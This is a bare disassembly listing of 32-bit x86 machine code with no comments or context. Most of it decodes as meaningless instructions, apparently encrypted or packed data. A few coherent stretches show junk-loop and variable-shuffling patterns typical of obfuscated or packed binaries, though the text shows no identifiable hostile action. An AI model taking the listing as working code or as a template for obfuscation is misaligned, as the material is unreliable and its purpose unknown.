  4030ce:	(bad)  
  4030cf:	fistp  QWORD PTR [ecx]
  4030d1:	ror    BYTE PTR [edi+eax*4],cl
  4030d4:	daa    
  4030d5:	retf   
  4030d6:	sbb    edi,DWORD PTR [edx-0x5a]
  4030d9:	add    ebx,ecx
  4030db:	lods   eax,DWORD PTR ds:[esi]
  4030dc:	les    edi,FWORD PTR [edx-0x4b0628ff]
  4030e2:	jbe    0x40310c
  4030e4:	mov    dl,0x38
  4030e6:	(bad)  
  4030e7:	retf   0x919a
  4030ea:	popf   
  4030eb:	or     esi,DWORD PTR [esi+0x778d786c]
  4030f1:	lea    edx,[edi]
  4030f3:	es out dx,al
  4030f5:	pop    ebx
  4030f6:	cmp    ch,BYTE PTR [edi-0x32b7f1aa]
  4030fc:	ss mov ch,0x79
  4030ff:	mov    al,0x41
  403101:	jne    0x40310d
  403103:	inc    esp
  403104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403105:	test   bh,dh
  403107:	fcmovnbe st,st(1)
  403109:	iret   
  40310a:	mov    edi,DWORD PTR [ebx]
  40310c:	out    0x4f,al
  40310e:	out    0x22,eax
  403110:	sub    edi,0x61
  403113:	lea    edx,[eax+0x6f84f466]
  403119:	jp     0x4030cd
  40311b:	push   cs
  40311c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40311d:	outs   dx,BYTE PTR ds:[esi]
  40311e:	lds    ebp,FWORD PTR [eax-0x37f805ff]
  403124:	jp     0x4030c2
  403126:	in     eax,0x28
  403128:	or     al,0x7d
  40312a:	cmp    DWORD PTR [ecx-0x3a6a0f71],eax
  403130:	ss push cs
  403132:	ins    DWORD PTR es:[edi],dx
  403133:	xchg   edi,eax
  403134:	rcr    BYTE PTR [ebx+0x56],cl
  403137:	pushf  
  403138:	sbb    DWORD PTR [eax+0x34],ebx
  40313b:	add    DWORD PTR [ebx-0x70],esp
  40313e:	mov    ebp,0xec120fb5
  403143:	xor    eax,0xc6625759
  403148:	outs   dx,DWORD PTR ds:[esi]
  403149:	stc    
  40314a:	add    DWORD PTR ds:0xb5880a2,esi
  403150:	xchg   DWORD PTR [ecx-0x39],ebx
  403153:	retf   0xf8fb
  403156:	sbb    ch,bh
  403158:	bound  ebp,QWORD PTR [eax-0x38]
  40315b:	inc    eax
  40315c:	xor    eax,0xf2f8f901
  403161:	dec    ebp
  403162:	xor    BYTE PTR [ebx+0x53791f29],ah
  403168:	icebp  
  403169:	push   0x192c5329
  40316e:	jo     0x4031c2
  403170:	add    BYTE PTR [ebp+0x73],cl
  403173:	push   esp
  403174:	cmp    eax,0x14ff4bc8
  403179:	push   ss
  40317a:	(bad)  
  40317b:	xor    al,0xa4
  40317d:	sub    ecx,esi
  40317f:	sar    DWORD PTR [eax+0x4d],cl
  403182:	adc    BYTE PTR [esi-0xe],ch
  403185:	je     0x40313f
  403187:	jb     0x40319d
  403189:	mov    dh,0x3e
  40318b:	bound  esp,QWORD PTR [edx]
  40318d:	dec    ebx
  40318e:	in     eax,dx
  40318f:	adc    DWORD PTR [esi+0x476536ef],ebp
  403195:	add    al,0x1
  403197:	xor    BYTE PTR [ecx-0x5a],ah
  40319a:	add    DWORD PTR [edi],edx
  40319c:	(bad)  
  40319d:	jge    0x403185
  40319f:	mov    ebp,0x9b7a9581
  4031a4:	push   ebx
  4031a5:	test   DWORD PTR [esi],ebx
  4031a7:	mov    dh,0x4b
  4031a9:	paddusb mm3,mm7
  4031ac:	fld    DWORD PTR ds:0xc542d9ca
  4031b2:	loop   0x4031be
  4031b4:	mov    BYTE PTR [ebx-0x38],al
  4031b7:	cli    
  4031b8:	sub    esp,DWORD PTR [esi]
  4031ba:	loop   0x4031ef
  4031bc:	and    al,0xe5
  4031be:	sub    BYTE PTR [esi],dh
  4031c0:	lock sti 
  4031c2:	out    0x5,al
  4031c4:	add    eax,0x8f2812c6
  4031c9:	test   DWORD PTR [ebx-0x180614eb],0xdc0fce10
  4031d3:	dec    ebp
  4031d4:	pop    eax
  4031d5:	into   
  4031d6:	inc    edx
  4031d7:	adc    BYTE PTR [eax+0x66391f76],bh
  4031dd:	push   ss
  4031de:	lods   al,BYTE PTR ds:[esi]
  4031df:	pop    edx
  4031e0:	fisub  WORD PTR [edx]
  4031e2:	xchg   esi,eax
  4031e3:	xchg   ebx,eax
  4031e4:	ins    BYTE PTR es:[edi],dx
  4031e5:	pushf  
  4031e6:	add    al,0x6d
  4031e8:	(bad)  
  4031e9:	push   cs
  4031ea:	div    BYTE PTR [ebx+eiz*8]
  4031ed:	sbb    ebx,esp
  4031ef:	jg     0x4031c4
  4031f1:	and    al,0xf3
  4031f3:	xor    BYTE PTR [edi-0x59b51c3c],ah
  4031f9:	popa   
  4031fa:	mov    al,ds:0x30362480
  4031ff:	mov    bh,ah
  403201:	test   eax,0x593546b
  403206:	inc    edi
  403207:	mov    ebx,0x9a20e19f
  40320c:	mov    ds:0x85933671,al
  403211:	scas   al,BYTE PTR es:[edi]
  403212:	mov    eax,ds:0x5030f1fe
  403217:	imul   edx,ebp,0xffffff81
  40321a:	or     bl,cl
  40321c:	pop    ebp
  40321d:	ins    BYTE PTR es:[edi],dx
  40321e:	arpl   WORD PTR [edx-0x597283b9],si
  403224:	sahf   
  403225:	cdq    
  403226:	mov    esp,0x7bc986bd
  40322b:	sub    eax,0xffe37e93
  403230:	sahf   
  403231:	(bad)  
  403232:	pop    ebx
  403233:	xor    bl,bl
  403235:	int3   
  403236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403237:	or     bh,ah
  403239:	pop    ds
  40323a:	fdivr  QWORD PTR [ecx]
  40323c:	std    
  40323d:	xor    DWORD PTR [ebx-0x3038a58a],0xffffffae
  403244:	cmp    ebx,DWORD PTR [esi-0x5557150b]
  40324a:	hlt    
  40324b:	mov    al,0x27
  40324d:	popf   
  40324e:	(bad)  
  40324f:	push   edi
  403250:	lods   eax,DWORD PTR ds:[esi]
  403251:	arpl   WORD PTR [ecx-0x105c1788],sp
  403257:	inc    edi
  403258:	rep ins DWORD PTR es:[edi],dx
  40325a:	pop    ecx
  40325b:	mov    edi,0xed790680
  403260:	or     ah,BYTE PTR [edx]
  403262:	arpl   cx,ax
  403264:	fisttp WORD PTR [esi]
  403266:	push   ebx
  403267:	xchg   DWORD PTR [eax+0x468e755f],ebx
  40326d:	hlt    
  40326e:	jbe    0x40326d
  403270:	cld    
  403271:	stos   DWORD PTR es:[edi],eax
  403272:	and    al,BYTE PTR [edx-0x75]
  403275:	push   ds
  403276:	mov    eax,0x8a38
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x43457b,0x434543
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43458f
  403297:	xor    ecx,DWORD PTR ds:0x4344eb
  40329d:	mov    DWORD PTR ds:0x43458f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43457f
  4032ac:	xor    DWORD PTR ds:0x434503,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43458f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4345bf
  4032c1:	mov    DWORD PTR ds:0x43458f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43458f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43460b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     cl,BYTE PTR [esi]
  4032f3:	add    BYTE PTR [edi+0x7e100b12],al
  4032f9:	jle    0x403351
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403341
  4032ff:	ret    
  403300:	add    eax,0x301f629c
  403305:	mov    ebp,DWORD PTR [edi+0x782479b6]
  40330b:	js     0x40333c
  40330d:	(bad)
  403312:	xor    DWORD PTR [eax-0x20481a2d],esi
  403318:	(bad)  
  403319:	scas   al,BYTE PTR es:[edi]
  40331a:	inc    ebp
  40331b:	cli    
  40331c:	test   BYTE PTR [edi+0x64b346cf],0xf4
  403323:	push   esi
  403324:	pop    cx
  403326:	and    DWORD PTR [edx+0x3d3435fc],0x45204013
  403330:	(bad)  [ecx-0x28]
  403333:	enter  0xc0ab,0x46
  403337:	nop
  403338:	and    edi,ebp
  40333a:	xlat   BYTE PTR ds:[ebx]
  40333b:	(bad)  
  40333c:	std    
  40333d:	xor    ecx,DWORD PTR [edi-0x69ff0844]
  403343:	mov    ecx,0xfa23798c
  403348:	int3   
  403349:	jmp    0x4033c4
  40334b:	cs inc eax
  40334d:	mov    eax,ds:0x4c11b23c
  403352:	push   0xffffffda
  403354:	xchg   edx,eax
  403355:	out    dx,eax
  403356:	inc    ebx
  403357:	scas   eax,DWORD PTR es:[edi]
  403358:	mov    edi,0x224c79da
  40335d:	jns    0x4032e8
  40335f:	mov    esi,0x58dfecda
  403364:	dec    edi
  403365:	pushf  
  403366:	outs   dx,DWORD PTR ds:[esi]
  403367:	or     DWORD PTR [eax+0x31],ecx
  40336a:	popf   
  40336b:	mov    al,ds:0x2ea13b3e
  403370:	jno    0x403331
  403372:	sbb    cl,BYTE PTR [eax-0x4f]
  403375:	dec    ecx
  403376:	gs jge 0x40331e
  403379:	retf   
  40337a:	inc    ebx
  40337b:	and    dh,cl
  40337d:	rcl    BYTE PTR [ebx+ebx*4-0x51f0ddf4],1
  403384:	mov    ds:0x94d6b514,eax
  403389:	outs   dx,BYTE PTR ds:[esi]
  40338a:	imul   edi,DWORD PTR [ebx],0xffffffec
  40338d:	mov    al,0x7c
  40338f:	xchg   ecx,eax
  403390:	cli    
  403391:	mov    esp,0x8d443bf0
  403396:	int    0x4f
  403398:	mov    ds:0xc311cd48,al
  40339d:	fadd   QWORD PTR [edx+0x1a]
  4033a0:	pop    ebp
  4033a1:	stos   DWORD PTR es:[edi],eax
  4033a2:	adc    DWORD PTR [eax-0x2c],0xffffffe0
  4033a6:	loopne 0x40337e
  4033a8:	sub    eax,0x4cd1a771
  4033ad:	icebp  
  4033ae:	jmp    0x403378
  4033b0:	addr16 and eax,0x58e9a503
  4033b6:	dec    edx
  4033b7:	out    dx,eax
  4033b8:	ds mov edx,0x75120ef2
  4033be:	test   BYTE PTR [edx+ebx*4+0x11700560],bh
  4033c5:	push   ecx
  4033c6:	rcl    DWORD PTR [ecx+0x78],1
  4033c9:	jns    0x403411
  4033cb:	mov    ebp,0x1675b12b
  4033d0:	cmp    dl,BYTE PTR [esi]
  4033d2:	mov    esi,0xc3d4e803
  4033d7:	enter  0xfc7,0xf9
  4033db:	mov    ch,0x39
  4033dd:	dec    ebp
  4033de:	mov    eax,ds:0xeff8b0b
  4033e3:	fmul   QWORD PTR [esi+0x57]
  4033e6:	std    
  4033e7:	mov    al,BYTE PTR fs:[ebx+esi*8-0x5a]
  4033ec:	dec    edx
  4033ed:	inc    esp
  4033ee:	dec    edx
  4033ef:	jbe    0x403434
  4033f1:	xchg   ebx,eax
  4033f2:	pop    es
  4033f3:	adc    ah,dh
  4033f5:	cmp    eax,0xcc9de5b1
  4033fa:	in     al,0x41
  4033fc:	inc    edi
  4033fd:	or     eax,0x1fac2670
  403402:	(bad)
  403405:	mov    dh,ch
  403407:	stos   BYTE PTR es:[edi],al
  403408:	(bad)  
  40340a:	adc    al,0xa2
  40340c:	jno    0x4033a9
  40340e:	popw   es
  403410:	xor    esp,eax
  403412:	cmp    ebx,DWORD PTR [ebx]
  403414:	sub    eax,0x9831c0e8
  403419:	neg    BYTE PTR [edx+eiz*4]
  40341c:	add    eax,0xde3808e3
  403421:	push   esp
  403422:	jecxz  0x4033b6
  403424:	add    eax,0xbff29fe0
  403429:	sub    ebx,edx
  40342b:	xlat   BYTE PTR ds:[ebx]
  40342c:	out    dx,eax
  40342d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40342e:	repnz push 0x9c6357e0
  403434:	les    esi,FWORD PTR [edx]
  403436:	shr    DWORD PTR [edx],0xcd
  403439:	mov    bh,0xae
  40343b:	xchg   DWORD PTR [eax],eax
  40343d:	pop    eax
  40343e:	xor    BYTE PTR [ecx+0x9],cl
  403441:	hlt    
  403442:	xor    al,0xb5
  403444:	pop    ss
  403445:	mov    ds:0xbc99af2b,al
  40344a:	lds    esi,FWORD PTR [ecx-0x22]
  40344d:	inc    esi
  40344e:	icebp  
  40344f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403450:	xor    al,ah
  403452:	fnstsw WORD PTR [ecx]
  403454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403455:	hlt    
  403456:	mov    BYTE PTR [edx-0xbd67a0d],dh
  40345c:	ret    0xab2c
  40345f:	cmp    DWORD PTR [esp+edx*8+0x62],ebp
  403463:	clc    
  403464:	mov    esp,0xf1f7f69e
  403469:	cld    
  40346a:	rol    BYTE PTR [edx+0x60174d69],0x7d
  403471:	dec    eax
  403472:	ins    DWORD PTR es:[edi],dx
  403473:	and    eax,0xd6820367
  403478:	pop    ecx
  403479:	dec    esp
  40347a:	leave  
  40347b:	int3   
  40347c:	sub    esp,ebx
  40347e:	cli    
  40347f:	jno    0x4034fe
  403481:	push   cs
  403482:	retf   0xe84d
  403485:	repz mov eax,0x1c74858c
  40348b:	(bad)  
  40348c:	hlt    
  40348d:	add    eax,0xe2184df8
  403492:	pop    ebx
  403493:	enter  0x2c29,0xf1
  403497:	ins    BYTE PTR es:[edi],dx
  403498:	aam    0x43
  40349a:	push   ss
  40349b:	ss cmp ecx,ecx
  40349e:	pop    es
  40349f:	xchg   DWORD PTR [eax],ecx
  4034a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034a2:	inc    ebx
  4034a3:	cmc    
  4034a4:	mov    ds:0x1e453d20,al
  4034a9:	and    eax,0x20290750
  4034ae:	add    dh,BYTE PTR [esi-0x50d6c13]
  4034b4:	lods   eax,DWORD PTR ds:[esi]
  4034b5:	mov    ebp,0x3113c956
  4034ba:	loope  0x40352d
  4034bc:	add    DWORD PTR [ebp-0x32],ebx
  4034bf:	scas   al,BYTE PTR es:[edi]
  4034c0:	xor    al,0x9e
  4034c2:	stos   BYTE PTR es:[edi],al
  4034c3:	fnstenv [ecx]
  4034c5:	icebp  
  4034c6:	mov    al,ds:0x632b3ea3
  4034cb:	rol    BYTE PTR [eax-0xfbf8921],0x79
  4034d2:	xor    bl,BYTE PTR [ebx-0x4d591525]
  4034d8:	xor    esp,DWORD PTR [ebp+0x2]
  4034db:	rol    DWORD PTR [ecx+eax*8-0x65f746aa],0x37
  4034e3:	stos   DWORD PTR es:[edi],eax
  4034e4:	mov    ebx,0x6339afb4
  4034e9:	enter  0xa280,0xb3
  4034ed:	jb     0x4034cf
  4034ef:	inc    ebp
  4034f0:	adc    ebp,DWORD PTR [eax+0x6724b644]
  4034f6:	in     al,dx
  4034f7:	mov    eax,ds:0xaa797396
  4034fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034fd:	mov    esi,0x6e64e390
  403502:	iret   
  403503:	mov    dh,0x4b
  403505:	add    DWORD PTR [eax+ebp*8+0x54fea543],esp
  40350c:	or     al,0x3f
  40350e:	stos   DWORD PTR es:[edi],eax
  40350f:	pop    esi
  403510:	pushf  
  403511:	adc    BYTE PTR [ecx+eax*4],cl
  403514:	fnsave [eax+0x8]
  403517:	adc    al,0x10
  403519:	adc    eax,0x4de0df35
  40351e:	mov    dh,0x7
  403520:	mov    eax,0xb0020da7
  403525:	jno    0x40350d
  403527:	adc    ah,ch
  403529:	and    al,0xe5
  40352b:	sub    DWORD PTR [ebx],edx
  40352d:	outs   dx,BYTE PTR ds:[esi]
  40352e:	mov    edx,DWORD PTR [eax+0x3ddce7b]
  403534:	retf   
  403535:	lods   eax,DWORD PTR ds:[esi]
  403536:	dec    eax
  403537:	sbb    DWORD PTR [esi-0x16],ecx
  40353a:	push   esi
  40353b:	pop    ds
  40353c:	xchg   ecx,eax
  40353d:	arpl   WORD PTR [edx+0xd95358b],bp
  403543:	pop    edx
  403544:	jmp    0x4034cb
  403546:	push   eax
  403547:	lds    edx,FWORD PTR [edx-0x65]
  40354a:	hlt    
  40354b:	stc    
  40354c:	push   ebp
  40354d:	retf   0x4c32
  403550:	push   esi
  403551:	xor    eax,0x9ad72331
  403556:	out    dx,eax
  403557:	jmp    0x40355d
  403559:	es cmc 
  40355b:	sar    DWORD PTR [esi-0x7a204cce],cl
  403561:	out    dx,eax
  403562:	call   0xfb7e:0xce5268a3
  403569:	ficom  DWORD PTR [esp+ebx*8-0x65]
  40356d:	adc    eax,0xe6689827
  403572:	icebp  
  403573:	mov    BYTE PTR [ebp-0x698d8b30],bl
  403579:	dec    ebx
  40357a:	les    ecx,FWORD PTR [eax+0x3da46922]
  403580:	cmp    bl,BYTE PTR [ebx+0x3cf0573b]
  403586:	into   
  403587:	mov    dh,0x1e
  403589:	cs sub edx,esi
  40358c:	or     BYTE PTR [edi+0x3e],bl
  40358f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403590:	outs   dx,BYTE PTR ds:[esi]
  403591:	push   es
  403592:	pop    ecx
  403593:	push   es
  403594:	psrlw  mm1,QWORD PTR [esi]
  403597:	lock adc ebx,edx
  40359a:	mov    bl,0x37
  40359c:	int    0xb7
  40359e:	push   edx
  40359f:	pushf  
  4035a0:	mov    eax,0x2ef3d703
  4035a5:	cmp    edx,edi
  4035a7:	inc    esi
  4035a8:	dec    esi
  4035a9:	(bad)  
  4035aa:	(bad)  [esi]
  4035ac:	call   0x4a4552a7
  4035b1:	nop
  4035b2:	fstp   QWORD PTR [edx+0x7f]
  4035b5:	popa   
  4035b6:	test   BYTE PTR [esi+ebx*2+0x47],0x12
  4035bb:	lahf   
  4035bc:	push   ecx
  4035bd:	dec    edi
  4035be:	(bad)  
  4035bf:	jns    0x40359c
  4035c1:	test   al,0xc8
  4035c3:	xchg   BYTE PTR [ecx-0x669b15a8],dl
  4035c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ca:	xor    edi,DWORD PTR [esi+0x2a]
  4035cd:	nop
  4035ce:	rcl    esp,cl
  4035d0:	inc    edx
  4035d1:	push   ebp
  4035d2:	lods   al,BYTE PTR ds:[esi]
  4035d3:	pop    edi
  4035d4:	dec    BYTE PTR [edx-0x39]
  4035d7:	mov    bl,0x75
  4035d9:	scas   al,BYTE PTR es:[edi]
  4035da:	lea    edi,[esi+eiz*1]
  4035dd:	dec    edi
  4035de:	(bad)  
  4035df:	cmc    
  4035e0:	loopne 0x403624
  4035e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e3:	jo     0x403616
  4035e5:	je     0x40359f
  4035e7:	mov    ds:0xbcd05278,al
  4035ec:	sub    eax,0x95217299
  4035f1:	xor    edx,0x9a853be4
  4035f7:	pop    edi
  4035f8:	inc    esp
  4035f9:	ins    BYTE PTR es:[edi],dx
  4035fa:	xchg   edx,eax
  4035fb:	push   eax
  4035fc:	in     al,dx
  4035fd:	adc    ah,BYTE PTR [ecx-0x39b1036]
  403603:	pusha  
  403604:	dec    ebx
  403605:	out    0x86,al
  403607:	aam    0x8d
  403609:	mov    bh,0x9
  40360b:	add    bl,BYTE PTR [ebx]
  40360d:	inc    ecx
  40360e:	jle    0x403663
  403610:	mov    fs,WORD PTR [ebx-0x24068ca3]
  403616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403617:	(bad)  
  403618:	fidiv  WORD PTR [eax-0x36de4cd8]
  40361e:	push   ecx
  40361f:	sbb    BYTE PTR ds:0xd1c705e3,ah
  403625:	pop    eax
  403626:	and    dh,BYTE PTR [esi]
  403628:	or     eax,0x1ac80d16
  40362d:	sub    dh,bl
  40362f:	repnz out 0xa3,eax
  403632:	je     0x40368a
  403634:	loopne 0x4035d7
  403636:	outs   dx,BYTE PTR ds:[esi]
  403637:	int    0xa7
  403639:	or     al,0x4c
  40363b:	out    dx,eax
  40363c:	mov    esi,0x2212ae93
  403641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403642:	lods   al,BYTE PTR ds:[esi]
  403643:	lea    edi,[esi-0x10f0b670]
  403649:	dec    eax
  40364a:	test   DWORD PTR [edx+0x13],esi
  40364d:	cmp    dh,dl
  40364f:	jno    0x4035e4
  403651:	enter  0x5d84,0x79
  403655:	jo     0x403654
  403657:	inc    edi
  403658:	jl     0x4036d5
  40365a:	push   0x70
  40365c:	icebp  
  40365d:	mov    ebx,0x67a8df29
  403662:	shl    eax,0x4b
  403665:	sbb    al,0xb1
  403667:	xchg   DWORD PTR [ecx-0x1152db01],edx
  40366d:	cmp    DWORD PTR [esi+eiz*2+0x30fc507b],edx
  403674:	in     al,dx
  403675:	icebp  
  403676:	pusha  
  403677:	push   edi
  403678:	adc    eax,0x6e8ccee1
  40367d:	add    al,0x8a
  40367f:	(bad)  
  403680:	xlat   BYTE PTR ds:[ebx]
  403681:	call   0x6ea7:0xedb0a69d
  403688:	int3   
  403689:	in     al,0xc9
  40368b:	nop
  40368c:	stc    
  40368d:	inc    esp
  40368e:	hlt    
  40368f:	mov    edi,gs
  403691:	mov    ebx,0x819e62fc
  403696:	cmp    BYTE PTR [edx],dl
  403698:	mov    ch,0x57
  40369a:	test   DWORD PTR [eax+0x24072136],ebx
  4036a0:	adc    DWORD PTR [esi+0x121f2b49],esi
  4036a6:	mov    bl,0x45
  4036a8:	or     edx,DWORD PTR [esi+0x6358ea12]
  4036ae:	imul   DWORD PTR [esi]
  4036b0:	adc    bh,BYTE PTR [ebx]
  4036b2:	and    eax,0x887d1707
  4036b7:	mov    edi,0x91e5ac91
  4036bc:	or     ebp,DWORD PTR [ebx-0x6]
  4036bf:	jne    0x4036ea
  4036c1:	adc    al,0x25
  4036c3:	daa    
  4036c4:	dec    eax
  4036c5:	clc    
  4036c6:	ins    BYTE PTR es:[edi],dx
  4036c7:	lods   eax,DWORD PTR ds:[esi]
  4036c8:	cmc    
  4036c9:	push   0x70
  4036cb:	into   
  4036cc:	inc    ebp
  4036cd:	pop    eax
  4036ce:	popa   
  4036cf:	adc    dh,BYTE PTR [eax]
  4036d1:	loope  0x4036e5
  4036d3:	add    DWORD PTR fs:[edx-0x7400ba76],ebp
  4036da:	or     eax,0x4344eb
  4036df:	sbb    ecx,DWORD PTR ds:0x434607
  4036e5:	mov    DWORD PTR ds:0x4344eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434613,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4344fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4344f7,0x434607
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434577,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434587,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434587
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434587,ecx
  40373d:	cmp    DWORD PTR ds:0x434587,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434587,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4345cb,0x14
  403779:	cmp    DWORD PTR ds:0x4345cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4345cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4345cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4345cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4345cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4345cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4345cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4344e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4344e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4344e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434749
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4344e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4344e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4344e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4344e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4344e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434587,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43460b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43454f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434543
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43454b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	call   0x63b50be3
  4038c2:	adc    edi,DWORD PTR [esi+0x7e]
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x40387b
  4038ca:	(bad)  [eax+0x30]
  4038cd:	in     al,0x25
  4038cf:	jge    0x4038e3
  4038d1:	adc    dh,BYTE PTR [edi+0x5c]
  4038d4:	jmp    0xebe3eb32
  4038d9:	cmp    dh,bh
  4038db:	inc    ecx
  4038dc:	push   cs
  4038dd:	test   ch,ah
  4038df:	adc    DWORD PTR [esi+0x18],0x54
  4038e3:	pcmpgtw mm1,mm7
  4038e6:	and    eax,0x58fcfbc5
  4038eb:	dec    edi
  4038ec:	loope  0x403874
  4038ee:	and    esi,DWORD PTR [ebp-0x25a5f548]
  4038f4:	sub    DWORD PTR [edx+0x7c],0x6dd505d5
  4038fb:	test   DWORD PTR [ebp-0x755a3af6],esp
  403901:	mov    dh,0x57
  403903:	aas    
  403904:	push   ebp
  403905:	(bad)  
  403906:	sbb    esi,edi
  403908:	mov    bh,0x44
  40390a:	hlt    
  40390b:	in     eax,0x7d
  40390d:	cmc    
  40390e:	addr16 je 0x40395e
  403911:	ins    DWORD PTR es:[edi],dx
  403912:	or     esi,esi
  403914:	xor    cl,0x43
  403917:	call   0xa52f:0xd2db0e42
  40391e:	inc    eax
  40391f:	fld    TBYTE PTR [eax]
  403921:	jne    0x403960
  403923:	loopne 0x403924
  403925:	scas   al,BYTE PTR es:[edi]
  403926:	daa    
  403927:	aas    
  403928:	sbb    al,0x12
  40392a:	jae    0x4038da
  40392c:	iret   
  40392d:	test   eax,0xe340dcaa
  403932:	push   ecx
  403933:	ja     0x40393f
  403935:	jmp    0xfda3b410
  40393a:	sbb    al,0x3a
  40393c:	outs   dx,DWORD PTR ds:[esi]
  40393d:	mov    BYTE PTR [edx],0x2e
  403940:	xchg   edi,eax
  403941:	mov    ds:0x84f4367b,al
  403946:	cmp    esi,DWORD PTR [eax+0x0]
  403949:	mov    dh,BYTE PTR [edx+0x6c]
  40394c:	addr16 aas 
  40394e:	les    ebx,FWORD PTR [ebx+0x2e74727d]
  403954:	shr    BYTE PTR [edx],0xc5
  403957:	cmp    al,0x8
  403959:	mov    dl,0xf
  40395b:	jmp    0x579777d4
  403960:	popa   
  403961:	enter  0x87fa,0xdc
  403965:	les    edi,FWORD PTR [ebx+0x50]
  403968:	xchg   cx,ax
  40396a:	mov    esi,0x88d11644
  40396f:	ins    DWORD PTR es:[edi],dx
  403970:	inc    ebx
  403971:	clc    
  403972:	in     eax,dx
  403973:	inc    edx
  403974:	loopne 0x403923
  403976:	cmp    dl,ah
  403978:	inc    edi
  403979:	jmp    0xebfb:0xa915344c
  403980:	cmp    dh,BYTE PTR [eax+0x52]
  403983:	push   ss
  403984:	dec    esi
  403985:	xchg   cl,bh
